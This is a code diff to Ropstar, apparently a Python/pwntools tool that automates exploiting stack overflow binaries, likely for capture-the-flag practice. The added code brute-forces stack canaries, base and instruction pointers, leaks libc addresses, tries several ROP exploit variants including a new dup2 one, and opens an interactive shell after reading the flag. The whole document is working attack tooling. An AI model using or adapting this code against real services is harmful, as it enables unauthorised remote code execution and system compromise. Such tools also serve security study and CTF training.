@@ -29,7 +29,9 @@ class Ropstar():
 		parser.add_argument('-win', help='specify win function address to call')	
 		parser.add_argument('-magic', help='magic string that needs to be sent before the payload')
 		parser.add_argument('-remote_offset', help='get offset remotely via observing responses (often required with canaries)', action='store_true')
+		parser.add_argument('-state', help='canary,rbp,rip (comma seperated)')
 		parser.add_argument('-plugins', help='run custom plugins')																											
+
 		self.args = parser.parse_args()
 		self.home = os.getlogin()
 		if self.home == 'root':
@@ -74,6 +76,23 @@ class Ropstar():
 		if self.args.magic and "\\n" in self.args.magic:
 			self.args.magic = self.args.magic.replace("\\n","")
 			self.magic_newline = True
+		self.canary = None
+
+
+	def fit(self, payload):
+		''' Fits the payload to the offset and potentical canary
+		'''
+		if self.binary.canary:
+			result = b''
+			log.info(f"Canary: {hex(self.canary)}")
+			result += p64(self.canary)
+			log.info(f"Bp: {hex(self.base_ptr)}")
+			result += p64(self.base_ptr)
+			result += payload
+			result = fit({self.offset:result})
+		else:
+			result = fit({self.offset:payload})
+		return result
 
 
 	def run_plugins(self, proc):
@@ -86,7 +105,7 @@ class Ropstar():
 				mod = import_module('plugins.'+p)
 				_class  = getattr(mod, 'Plugin')
 				plugin = _class(self.home)
-				plugin.run(proc)
+				plugin.run(proc, proxy=self.args.p)
 
 
 	def connect(self):
@@ -103,10 +122,15 @@ class Ropstar():
 		return p
 
 
-	def trigger(self, p, payload='', newline=True, recvall=False):
+	def trigger(self, p, payload='', newline=True, recvall=False, prercv=False):
 		''' function that puts payload into vulnerable buffer
 		'''
 		result = ''
+		
+		# clear buffer, this is slow, but sometimes required
+		if prercv:
+			p.recvlines(numlines=100, timeout=3)
+
 		if self.args.magic:
 			if not self.magic_newline:
 				payload = self.args.magic + payload
@@ -120,9 +144,9 @@ class Ropstar():
 			p.send(payload)
 		try:
 			if recvall:
-				result = p.recvall(timeout=2)
+				result = p.recvall(timeout=3)
 			else:
-				result = p.recvlines(numlines=100, timeout=2)
+				result = p.recvlines(numlines=100, timeout=3)
 		except EOFError:
 			pass
 		return result
@@ -162,9 +186,10 @@ class Ropstar():
 		for i in range(1, self.pattern_length):
 			p = self.connect()
 			try:
-				result = self.trigger(p, cyclic(i))
+				result = self.trigger(p, cyclic(i), recvall=True)
+				result = result.decode()
 				if self.success_marker not in result:
-					self.offset = i-1
+					self.offset = i#-1
 					log.success("Offset: "+str(self.offset))
 					return True 	
 			except EOFError:
@@ -211,7 +236,7 @@ class Ropstar():
 		p = self.connect()
 		# get positive verifier, so we know what to expect if it doesn't crash
 		result = self.trigger(p, 'test', newline=False, recvall=True)
-		self.success_marker = result[-6:]
+		self.success_marker = result[-6:].decode()
 		log.info("Success marker: "+self.success_marker)
 		p.close()
 
@@ -227,7 +252,7 @@ class Ropstar():
 				p.sendline("cat flag.txt")
 				flag = p.recvline()
 				if self.args.plugins:
-					self.run_plugins(p)
+					self.run_plugins(p,)
 				log.info('Time spent: '+str(round((time.time() - self.start_time),2))+'s')	
 				p.interactive()
 				return True
@@ -245,11 +270,26 @@ class Ropstar():
 		'''.format(bp))
 
 
+	def smart_leak(self, p=None):
+		# run seperate p
+		if not self.binary.canary and not p:
+			p = self.connect()		
+			leak = self.leak.leak_libc(p)
+			p.close()
+		# keep p open
+		elif not self.binary.canary and p:
+			leak = self.leak.leak_libc(p)
+		# run multiple p's
+		else:
+			leak = self.leak.leak_libc(p=None, is_forking=True)
+		return leak
+
+
 	def main(self):
 		self.start_time = time.time()
 
 		# offset can also be given on command line		
-		if not self.args.o:
+		if not self.args.o and not self.binary.canary:
 			# resolve offset dynamically
 			log.info("Getting offset")
 			result = self.get_dynamic()
@@ -269,7 +309,8 @@ class Ropstar():
 				except (IndexError, EOFError):
 					log.failure("Probably not vulnerable to format string vector")
 					return
-		else:
+
+		if self.args.o:
 			self.offset = int(self.args.o)
 			log.info("Offset: "+str(self.offset))
 
@@ -277,34 +318,44 @@ class Ropstar():
 			# we need a marker for successful, non crashing requests to bruteforce values
 			self.get_success_marker()
 			log.info("Binary uses stack canary")
-			log.info("Bruting canary, base ptr, intr ptr")	
-			log.info("This can take a while, go grab a coffee")
-			pause()
-			payload = cyclic(self.offset)
-			canary = self.leak.leak_qword(payload) # canary
-			payload += canary
-			base_ptr = self.leak.leak_qword(payload) # rbp
-			payload += base_ptr
-			instr_ptr = self.leak.leak_qword(payload) # rip
-			payload += instr_ptr
-			log.info("canary: "+hex(u64(canary)))
-			log.info("base ptr: "+hex(u64(base_ptr)))
-			log.info("instr ptr: "+hex(u64(instr_ptr)))
-			log.info("You probably want to copy these")
-			pause()	
-			# at this point we can assume we have the values				
-			self.canary = u64(canary)
-			self.base_ptr = u64(base_ptr)
-			self.instr_ptr = u64(instr_ptr)			
-			'''	
-			self.canary =  manual
-			self.base_ptr = manual
-			self.instr_ptr = manual
-			'''
+			# get offset
+			self.get_dynamic()
+
+			if self.offset == -1:
+				log.failure("Can't continue without offset, consider providing it with -o <offset>")
+				exit(-1) 
+			# did the user provide the values from a previous run ?
+			if self.args.state:
+				canary, base_ptr, instr_ptr = self.args.state.split(',')
+				self.canary = int(canary,16)
+				self.base_ptr = int(base_ptr,16)
+				self.instr_ptr = int(instr_ptr,16)
+				log.info("canary: "+hex(self.canary))
+				log.info("base ptr: "+hex(self.base_ptr))
+				log.info("instr ptr: "+hex(self.instr_ptr))
+			else:
+				# bruteforce values
+				log.info("Bruting canary, base ptr, intr ptr")	
+				log.info("This can take a while, go grab a coffee")
+				pause()
+				payload = cyclic(self.offset)
+				canary = self.leak.leak_qword(payload) # canary
+				payload = decode(payload) + canary
+				base_ptr = self.leak.leak_qword(payload) # rbp
+				payload = decode(payload) +  base_ptr
+				instr_ptr = self.leak.leak_qword(payload) # rip					
+				log.info("canary: "+hex(u64(canary)))
+				log.info("base ptr: "+hex(u64(base_ptr)))
+				log.info("instr ptr: "+hex(u64(instr_ptr)))				
+				self.canary = u64(canary)
+				self.base_ptr = u64(base_ptr)
+				self.instr_ptr = u64(instr_ptr)		
 			addr = self.instr_ptr - (self.instr_ptr & 0xfff)	
 			entry_offset = (self.binary.entry & 0xfffffffffffff000)
 			self.binary.address =  addr - entry_offset			
 			log.info("Base: "+hex(self.binary.address))
+			log.info("You probably want to save these values")
+			pause()	
 
 		if self.args.win:
 			p = self.connect()	
@@ -327,17 +378,18 @@ class Ropstar():
 
 		# dynamic complied binary, try leaking libc & exploiting via libc
 		log.info("Getting Leak")
-		p = self.connect()		
-		leak = self.leak.leak_libc(p)
-		p.close()
+		leak = self.smart_leak()
+
 		if len(leak) > 0:
 			log.info("Getting libc version")
 			versions = self.leak.ident_libc(leak)
-			exploits = [self.exploit.bss, self.exploit.bss_execve, self.exploit.default]
+			exploits = [self.exploit.bss, self.exploit.bss_execve, self.exploit.dup2, self.exploit.default]
 			for version in versions:
 				for exploit in exploits:
+
 					p = self.connect()
-					leak = self.leak.leak_libc(p)
+					leak = self.smart_leak(p)
+
 					if len(leak) == 0:
 						continue
 					log.info("Using "+version)
@@ -346,7 +398,7 @@ class Ropstar():
 					except IOError:
 						log.failure("Could not load "+version+ "(skipping)")
 						continue
-					name, addr = leak.items()[0]
+					name, addr = list(leak.items())[0]
 					libc.address = addr - libc.symbols[name]
 					log.success("Libc base: {0}".format(hex(libc.address)))
 					# exploit
@@ -371,8 +423,13 @@ if __name__ == '__main__':
  / /  / /_/ / /_/ (__  ) /_/ /_/ / /    
 /_/   \____/ .___/____/\__/\__,_/_/     
           /_/                           
-    				xct@vulndev.io      
+                  xct@vulndev.io | v0.2   								
 	"""
 	print(Fore.RED+logo+Style.RESET_ALL)
+
+	if sys.version_info < (3, 0):
+		print("Requires python 3.x")
+		exit(0)
+
 	app = Ropstar(sys.argv)
 	app.main()
